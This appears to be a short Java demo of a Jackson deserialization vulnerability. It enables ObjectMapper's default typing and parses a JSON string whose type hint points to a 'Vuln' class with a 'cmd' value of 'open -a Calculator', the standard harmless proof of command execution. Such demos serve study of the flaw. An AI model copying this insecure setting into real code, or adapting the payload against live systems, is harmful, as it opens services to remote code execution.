package point_jackjson;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class JackJsonDemo {
    public static void main(String[] args) throws IOException {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        String json = "{\"name\":\"Threezh1\",\"age\":20,\"cls\":[\"point_jackjson.Vuln\",{\"cmd\":\"open -a Calculator\"}]}";
        System.out.println(mapper.readValue(json, Person.class));
    }
}
）